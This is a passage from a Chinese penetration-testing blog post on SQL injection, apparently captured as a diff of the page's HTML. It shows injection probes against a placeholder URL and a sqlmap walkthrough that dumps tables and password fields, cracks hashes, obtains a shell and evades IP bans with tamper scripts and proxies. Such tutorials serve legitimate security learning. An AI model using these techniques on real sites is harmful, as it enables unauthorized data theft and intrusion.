+<p><a href="http://xxx.com/news.asp?id=123" target="_blank" rel="noopener">http://xxx.com/news.asp?id=123</a><br><a href="http://xxx.com/news.asp?id=123" target="_blank" rel="noopener">http://xxx.com/news.asp?id=123</a> ‘%2B’，返回的页面和1同；<br><a href="http://xxx.com/news.asp?id=123" target="_blank" rel="noopener">http://xxx.com/news.asp?id=123</a> ‘%2Basdf，返回的页面和1不同，或者说未发现该条记录，或者错误，</p>
+</blockquote>
+<p>则表示存在注入点，是文本型的。</p>
+<hr>
+<h1 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h1><p>1.对文本时使用 -r<br><img src="/images/pasted-2.png" alt="upload successful"><br>对链接时使用 -u<br>得到的基本信息如下</p>
+<p><img src="/images/pasted-3.png" alt="upload successful"><br>2.得到当前数据库名</p>
+<p><img src="/images/pasted-4.png" alt="upload successful"></p>
+<p><img src="/images/pasted-5.png" alt="upload successful"><br>3.对数据库表名进行枚举</p>
+<p><img src="/images/pasted-6.png" alt="upload successful"></p>
+<p><img src="/images/pasted-7.png" alt="upload successful"><br>4.用–columns对表中的列进行枚举</p>
+<p><img src="/images/pasted-8.png" alt="upload successful"></p>
+<p><img src="/images/pasted-9.png" alt="upload successful"><br>5.获取user表中的name和password字段</p>
+<p><img src="/images/pasted-10.png" alt="upload successful"><br>密码为密文，SQLmap会自动询问，是否爆破，选择“是”即可开始使用SQLMAP自带的字典进行爆破。<br>6。获取shell，选择后台语言</p>
+<p><img src="/images/pasted-11.png" alt="upload successful"><br><strong>注意</strong><br>-p 指定参数<br>-data 选择哪些数据<br>–proxy=域名:端口  代理<br>–technique 指定sqlmap使用的探测技术，默认情况下会测试所有的方式。<br>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p>
+<p>is-dba            当前用户权限</p>
+<p>dbs            所有数据库</p>
+<p>current-db        网站当前数据库</p>
+<p>users            所有数据库用户<br>current-user        当前数据库用户<br>tables            参数:列表名<br>columns            参数:列字段<br>dump            参数:下载数据<br><strong>测试时防止ip被ban，可用以下方法:</strong><br>python sqlmap.py -u 链接 -p query_type –random-agent –tamper=space2comment –delay=3.5 –time-sec=60 –proxy=<a href="http://ip:端口">http://ip:端口</a></p>
+<p>tamper  “space2comment.py”   将空格替换成/**/<br>equaltolike.py,                            将等号替换成like<br>symboliclogical.py                    用 &amp;&amp; 替换 and ，用 || 替换 or</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/03/27/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="prev" title="web渗透笔记之信息收集">
+      <i class="fa fa-chevron-left"></i> web渗透笔记之信息收集
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/04/03/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%EF%BC%88%E8%BF%9B%E9%98%B6%E7%AF%87%EF%BC%89/" rel="next" title="web渗透笔记之sql注入（进阶篇）">
+      web渗透笔记之sql注入（进阶篇） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入简介"><span class="nav-number">1.</span> <span class="nav-text">sql注入简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#判断是否存在注入"><span class="nav-number">2.</span> <span class="nav-text">判断是否存在注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#猜解SQL查询语句中的字段"><span class="nav-number">3.</span> <span class="nav-text">猜解SQL查询语句中的字段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#例："><span class="nav-number">3.1.</span> <span class="nav-text">例：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql盲注"><span class="nav-number"></span> <span class="nav-text">sql盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-判断是否存在注入，注入是字符型还是数字型"><span class="nav-number">0.1.</span> <span class="nav-text">1.判断是否存在注入，注入是字符型还是数字型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-猜解当前数据库名"><span class="nav-number">0.2.</span> <span class="nav-text">2.猜解当前数据库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-猜解数据库中的表名"><span class="nav-number">0.3.</span> <span class="nav-text">3.猜解数据库中的表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-猜解表中的字段名"><span class="nav-number">0.4.</span> <span class="nav-text">4.猜解表中的字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-猜数据-，一样思路"><span class="nav-number">0.5.</span> <span class="nav-text">5.猜数据 ，一样思路</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基于时间的盲注："><span class="nav-number"></span> <span class="nav-text">基于时间的盲注：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-判断是否存在注入，注入是字符型还是数字型-1"><span class="nav-number">0.1.</span> <span class="nav-text">1.判断是否存在注入，注入是字符型还是数字型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-猜解当前数据库名-1"><span class="nav-number">0.2.</span> <span class="nav-text">2.猜解当前数据库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-猜解数据库中的表名-1"><span class="nav-number">0.3.</span> <span class="nav-text">3.猜解数据库中的表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-猜解表中的字段名-1"><span class="nav-number">0.4.</span> <span class="nav-text">4.猜解表中的字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-猜解数据"><span class="nav-number">0.5.</span> <span class="nav-text">5.猜解数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#post注入"><span class="nav-number"></span> <span class="nav-text">post注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Access数据库注入"><span class="nav-number"></span> <span class="nav-text">Access数据库注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#其他注入点检测方法"><span class="nav-number"></span> <span class="nav-text">其他注入点检测方法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap的使用"><span class="nav-number"></span> <span class="nav-text">sqlmap的使用</span></a></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yida223</p>
+  <div class="site-description" itemprop="description">路漫漫其修远兮，吾将上下而求索</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yida223</span>
+</div>
+  <div class="powered-by">
+    <!--由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动-->
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
